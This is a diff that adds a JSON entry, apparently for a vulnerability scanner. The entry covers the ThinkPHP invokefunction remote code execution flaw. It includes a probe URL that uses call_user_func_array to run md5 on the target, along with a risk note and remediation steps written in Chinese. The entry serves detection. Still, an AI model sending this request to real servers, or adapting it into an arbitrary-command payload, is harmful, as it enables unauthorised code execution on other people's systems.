@@ -1,0 +1,7 @@
+{
+    "vul_name": "thinkphp_invoke_func_code_exec",
+    "vulnurl": "http://127.0.0.1:8080/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333",
+    "payload": "",
+    "vuln_risk": "高风险 - 该漏洞允许远程攻击者通过特定的URL调用，执行任意代码，可能导致系统被完全控制。",
+    "vuln_fix": "1. 确认并升级ThinkPHP框架到最新稳定版本，以修复已知的安全漏洞。\n2. 检查并禁用不必要的动态函数调用功能，如非必要，禁止使用call_user_func_array等敏感函数。\n3. 实施严格的输入验证和过滤，避免用户输入直接参与函数调用。\n4. 部署Web应用防火墙（WAF），配置规则以阻止针对此漏洞的恶意请求。\n5. 定期进行安全审计和漏洞扫描，及时发现并修复新出现的安全威胁。"
+}
